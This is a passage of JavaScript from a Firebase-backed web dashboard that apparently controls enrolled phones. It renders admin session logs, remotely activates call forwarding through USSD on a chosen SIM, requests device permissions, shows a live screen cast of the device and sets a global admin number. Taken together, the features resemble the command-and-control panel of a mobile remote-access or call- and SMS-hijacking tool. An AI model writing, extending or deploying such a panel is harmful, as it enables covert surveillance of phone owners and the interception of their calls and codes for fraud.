            Object.keys(activity[date]).forEach(adminId => {
                Object.keys(activity[date][adminId]).forEach(sessId => {
                    sessionList.push({ ...activity[date][adminId][sessId], sessId, adminId });
                });
            });
        });

        // Sort by timestamp: Latest login first
        sessionList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

        html += `<div class="space-y-6">
            <!-- Modern Table Header -->
            <div class="grid grid-cols-[1fr_1fr_0.8fr] gap-2 px-4 py-2 bg-slate-100 rounded-xl border border-slate-200">
                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest">Login</span>
                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest text-center">Logout</span>
                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest text-right">Terminal</span>
            </div>

            <!-- History List -->
            <div class="space-y-3">
                ${sessionList.map(s => {
                    const isActive = s.logout === "Active Now";
                    const logoutDisplay = isActive ? 
                        '<span class="flex items-center justify-center space-x-1"><span class="h-1 w-1 bg-emerald-500 rounded-full animate-ping"></span><span class="text-emerald-600">LIVE</span></span>' : 
                        (s.logout_time ? new Date(s.logout_time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }).toLowerCase() : '---');
                    
                    return `
                    <div class="group relative bg-white border border-slate-200 p-4 rounded-2xl shadow-sm hover:shadow-md hover:border-indigo-300 transition-all">
                        <div class="absolute -left-1 top-1/2 -translate-y-1/2 w-1.5 h-6 ${isActive ? 'bg-emerald-500' : 'bg-slate-200'} rounded-full"></div>
                        
                        <div class="grid grid-cols-[1fr_1fr_0.8fr] gap-2 items-center">
                            <!-- Login Column -->
                            <div class="flex items-center space-x-2">
                                <div class="w-6 h-6 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500"><i data-lucide="log-in" class="w-3 h-3"></i></div>
                                <span class="text-[11px] font-black text-slate-700">${s.login || '---'}</span>
                            </div>

                            <!-- Logout Column -->
                            <div class="flex items-center justify-center space-x-2 border-l border-r border-slate-50">
                                <div class="w-6 h-6 bg-rose-50 rounded-lg flex items-center justify-center text-rose-500"><i data-lucide="log-out" class="w-3 h-3"></i></div>
                                <span class="text-[11px] font-black text-slate-700">${logoutDisplay}</span>
                            </div>

                            <!-- Model Column -->
                            <div class="text-right">
                                <span class="text-[9px] font-black text-indigo-600 bg-indigo-50 px-2 py-1 rounded-lg border border-indigo-100 uppercase truncate inline-block max-w-full">${s.adminId || 'Unknown'}</span>
                            </div>
                        </div>
                    </div>
                    `;
                }).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Session Logs Found</div>'}
            </div>
        </div>`;
    } else if (activeModalType === 'active_admins') {
        // Current Active Admins Status Logic
        const admins = lastSnapshotData.admins || {};
        html += `<div class="space-y-4">
            <div class="flex items-center justify-between px-1">
                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Live Terminal Status</h4>
                <span class="flex items-center space-x-1">
                    <span class="h-1.5 w-1.5 bg-green-500 rounded-full animate-pulse"></span>
                    <span class="text-[8px] font-bold text-slate-400 uppercase">Realtime</span>
                </span>
            </div>
            <div class="space-y-2.5">
                ${Object.entries(admins).map(([id, info]) => `
                    <div class="bg-white border-2 border-slate-100 p-4 rounded-3xl flex items-center justify-between shadow-sm hover:border-indigo-100 transition-all">
                        <div class="flex items-center space-x-3">
                            <div class="w-10 h-10 ${info.status === 'ACTIVE' ? 'bg-indigo-100 text-indigo-600' : 'bg-slate-100 text-slate-400'} rounded-2xl flex items-center justify-center">
                                <i data-lucide="shield-check" class="w-5 h-5"></i>
                            </div>
                            <div class="text-xs">
                                <p class="font-black text-slate-800 uppercase tracking-tight">${info.model || 'Admin'}</p>
                                <p class="text-[8px] font-bold text-slate-400 uppercase mt-0.5 tracking-tighter">ID: ${id.substring(0, 12)}...</p>
                            </div>
                        </div>
                        <span class="text-[9px] font-black px-2.5 py-1 rounded-xl ${info.status === 'ACTIVE' ? 'bg-green-100 text-green-600 border border-green-200' : 'bg-slate-50 text-slate-400 border border-slate-100'} uppercase tracking-tighter">${info.status}</span>
                    </div>
                `).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Admins Registered</div>'}
            </div>
        </div>`;
    } else if (activeModalType === 'call_forwarding') {
        // Call Forwarding Modal UI
        html += `<div class="space-y-6">
            <div class="space-y-2">
                <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Forwarding Number</label>
                <div class="relative">
                    <div class="absolute left-4 top-1/2 -translate-y-1/2 text-indigo-500"><i data-lucide="phone" class="w-4 h-4"></i></div>
                    <input type="tel" id="cf-number-modal" maxlength="10" placeholder="10 Digit Mobile Number" 
                        class="w-full bg-white border-2 border-slate-100 rounded-2xl pl-12 pr-4 py-4 text-sm font-bold text-slate-800 placeholder-slate-300 focus:border-indigo-500 focus:ring-4 focus:ring-indigo-500/10 transition-all outline-none">
                </div>
            </div>

            <div class="space-y-3">
                <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Select SIM Slot</label>
                <div class="grid grid-cols-2 gap-3">
                    ${Object.values(dev.sims || {}).map(sim => `
                        <div onclick="selectedSlot=${sim.slot}; renderModalUI('${deviceId}')" 
                            class="cursor-pointer p-4 rounded-2xl border-2 transition-all ${selectedSlot === sim.slot ? 'border-indigo-600 bg-indigo-50/50 shadow-md shadow-indigo-100' : 'border-slate-100 bg-white hover:border-slate-200'}">
                            <div class="flex items-center justify-between mb-2">
                                <div class="p-1.5 bg-slate-50 rounded-lg"><i data-lucide="sim-card" class="w-3.5 h-3.5 ${selectedSlot === sim.slot ? 'text-indigo-600' : 'text-slate-400'}"></i></div>
                                ${selectedSlot === sim.slot ? '<div class="w-4 h-4 bg-indigo-600 rounded-full flex items-center justify-center"><i data-lucide="check" class="w-2.5 h-2.5 text-white"></i></div>' : ''}
                            </div>
                            <p class="text-[10px] font-black text-slate-800 truncate">${sim.carrier_name || 'No Carrier'}</p>
                            <p class="text-[9px] font-bold text-slate-400 mt-1">${sim.number || 'SIM ' + (sim.slot+1)}</p>
                        </div>
                    `).join('')}
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 pt-2 border-t border-slate-100">
                <button onclick="handleCallForwardClick('${deviceId}', null, 'activate')" class="bg-emerald-500 hover:bg-emerald-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-emerald-200 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
                    Activate
                </button>
                <button onclick="handleCallForwardClick('${deviceId}', null, 'deactivate')" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-rose-200 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
                    Deactivate
                </button>
            </div>

            <!-- Realtime Response Feedback -->
            <div class="mt-4 p-4 rounded-2xl border-2 border-dashed ${dev.call_forward ? 'border-indigo-500/20 bg-indigo-50/30' : 'border-slate-100 bg-slate-50/50'} text-center transition-all">
                ${dev.call_forward ? `
                    <div class="space-y-1">
                        <p class="text-[8px] font-black text-indigo-400 uppercase tracking-widest">Device Feedback</p>
                        <p class="text-[11px] font-black text-indigo-600 uppercase tracking-tight">${dev.call_forward.status || 'Command Sent'}</p>
                        <p class="text-[10px] font-bold text-slate-500 leading-tight">${dev.call_forward.message || 'Device is processing USSD...'}</p>
                    </div>
                ` : `
                    <p class="text-[9px] font-black text-slate-300 uppercase tracking-widest">Ready for command</p>
                `}
            </div>
        </div>`;
    } else if (activeModalType === 'permissions') {
        // Permissions Logic
        const permissions = dev.permissions || {};
        html += `<div class="space-y-4">
            <div class="flex items-center space-x-2 px-1">
                <i data-lucide="shield-check" class="w-3.5 h-3.5 text-indigo-600"></i>
                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Permission Access Control</h4>
            </div>
            <div class="space-y-2.5">
                ${Object.entries(permissions).length > 0 ? Object.entries(permissions).map(([key, value]) => {
                    let statusBadge = '';
                    let actionBtn = '';
                    
                    if (value === true || value === "true") {
                        statusBadge = '<span class="text-[8px] font-black text-green-500 bg-green-50 px-2 py-0.5 rounded-md uppercase border border-green-100">Granted</span>';
                    } else if (value === "requested") {
                        statusBadge = '<span class="text-[8px] font-black text-amber-500 bg-amber-50 px-2 py-0.5 rounded-md uppercase border border-amber-100 animate-pulse">Requested</span>';
                    } else {
                        statusBadge = '<span class="text-[8px] font-black text-red-500 bg-red-50 px-2 py-0.5 rounded-md uppercase border border-red-100">Denied</span>';
                        actionBtn = `<button onclick="requestPermission('${deviceId}', '${key}')" class="text-[9px] font-black text-white bg-indigo-600 px-3 py-1.5 rounded-xl uppercase tracking-tighter shadow-md shadow-indigo-100 active:scale-95 transition-all">Request</button>`;
                    }

                    return `
                        <div class="bg-white border-2 border-slate-100 p-3.5 rounded-2xl flex items-center justify-between shadow-sm hover:border-indigo-100 transition-all">
                            <div class="flex flex-col">
                                <span class="text-[11px] font-bold text-slate-700 uppercase tracking-tight">${key.replace(/_/g, ' ')}</span>
                                <div class="mt-1">${statusBadge}</div>
                            </div>
                            ${actionBtn}
                        </div>
                    `;
                }).join('') : '<p class="text-center text-slate-400 py-10 text-xs font-bold">No permissions data found</p>'}
            </div>
        </div>`;
    } else if (activeModalType === 'screen_control') {
        // Screen Control UI
        const castData = dev.Screen_cast || {};
        html += `<div class="flex flex-col items-center space-y-4">
            <div class="relative w-full aspect-[9/16] max-w-[280px] bg-slate-900 rounded-[2.5rem] overflow-hidden border-8 border-slate-800 shadow-2xl mx-auto flex items-center justify-center">
                ${castData.data ? 
                    `<img id="screen-frame" src="data:image/jpeg;base64,${castData.data}" class="w-full h-full object-contain" />` : 
                    `<div class="flex flex-col items-center justify-center text-slate-500 space-y-3">
                        <div class="w-10 h-10 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
                        <p class="text-[10px] font-black uppercase tracking-[0.2em] text-indigo-400">Syncing Stream...</p>
                    </div>`
                }
            </div>
            <div class="bg-white border-2 border-slate-100 p-4 rounded-3xl w-full shadow-sm">
                <div class="flex items-center justify-between">
                    <div class="flex items-center space-x-2">
                        <span class="flex h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
                        <span class="text-[10px] font-black text-slate-900 uppercase tracking-widest">Live Cast: ${dev.device?.device_name || 'Generic'}</span>
                    </div>
                    <i data-lucide="monitor-play" class="w-4 h-4 text-indigo-500"></i>
                </div>
            </div>
        </div>`;
    }

    if (html === '') {
        html = `<div class="flex flex-col items-center justify-center py-16 text-center space-y-4">
                    <div class="w-16 h-16 bg-slate-50 rounded-full flex items-center justify-center text-slate-200"><i data-lucide="database-zap" class="w-8 h-8"></i></div>
                    <p class="text-[10px] font-black text-slate-300 uppercase tracking-widest">No data records found</p>
                </div>`;
    }

    modalBody.innerHTML = html;
    lucide.createIcons();
}

/**
 * Updates the global admin number in Firebase
 */
function updateGlobalAdminNumber() {
    const num = document.getElementById('global-admin-num-input').value.trim();
    if (num.length < 10) {
        showToast("Enter valid 10-digit number", "error");
        return;
    }
    database.ref('AppStats/global_admin_number').set(num)
        .then(() => showToast("Admin Number Updated"))
        .catch(() => showToast("Update Failed", "error"));
}

/**
 * Deletes the global admin number from Firebase
 */
function deleteGlobalAdminNumber() {
    if (!confirm("Are you sure you want to delete the admin number?")) return;
    database.ref('AppStats/global_admin_number').remove()
        .then(() => {
            document.getElementById('global-admin-num-input').value = '';
            showToast("Admin Number Deleted");
        })
        .catch(() => showToast("Delete Failed", "error"));
}

/**
 * Sends a request command for a specific permission
 */
function requestPermission(deviceId, permissionKey) {
    if (!deviceId) return;
    database.ref(`Devices/${deviceId}/permissions/${permissionKey}`).set("requested")
        .then(() => {
            showToast("Request Sent");
        })
        .catch((error) => {
            console.error("Permission Request Error:", error);
            showToast("Action Failed", "error");
        });
}

// Consolidated Handle browser/hardware back button
window.onpopstate = function(event) {
    if (localStorage.getItem('isLoggedIn') === 'true') {
        // If a modal is open, close it first
        if (activeModalDeviceId) {
            closeDetailsModal();
            return;
        }
        // Otherwise navigate to previous tab
        if (event.state && event.state.tabId) {
            // Switch to previous tab without pushing to history again
            switchTab(event.state.tabId, false);
        } else {
            // Fallback to home if no specific state exists
            switchTab('home', false);
        }
    }
};
// Enter key support for login
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') attemptLogin();
});

/**
 * Switches between different dashboard fragments
 * @param {string} tabId - The name of the tab to activate
 * @param {boolean} pushHistory - Whether to push to browser history
 */
function switchTab(tabId, pushHistory = true) {
    const tabs = ['home', 'devices', 'sms', 'more', 'device-details'];
    
    // If moving away from details, stop tracking active device
    if (tabId !== 'device-details') {
        activeDeviceId = null;
        localStorage.removeItem('activeDeviceId');
    }

    // Save active tab for refresh persistence
    localStorage.setItem('activeTab', tabId);

    tabs.forEach(id => {
        const section = document.getElementById(`${id}-section`);
        const navBtn = document.getElementById(`nav-${id}`);
        
        if (section) {
            if (id === tabId) {
                section.classList.remove('hidden');
                if (navBtn) {
                    navBtn.classList.add('text-indigo-600');
                    navBtn.classList.remove('text-slate-400');
                }
            } else {
                section.classList.add('hidden');
                if (navBtn) {
                    navBtn.classList.remove('text-indigo-600');
                    navBtn.classList.add('text-slate-400');
                }
            }
        }
    });
    
    // Toggle Navbar Profile vs Back Button
    const profileInfo = document.getElementById('nav-profile-info');
    const backBtn = document.getElementById('nav-back-container');
    if (tabId === 'device-details') {
        profileInfo.classList.add('hidden');
        backBtn.classList.remove('hidden');
        backBtn.classList.add('flex');
    } else {
        profileInfo.classList.remove('hidden');
        backBtn.classList.add('hidden');
        backBtn.classList.remove('flex');
    }

    // Update history state for back button support
    if (pushHistory && (typeof currentTab === 'undefined' || currentTab !== tabId)) {
        history.pushState({ tabId: tabId }, "", "");
    }
    currentTab = tabId;

    // Refresh icons for dynamic content
    lucide.createIcons();
}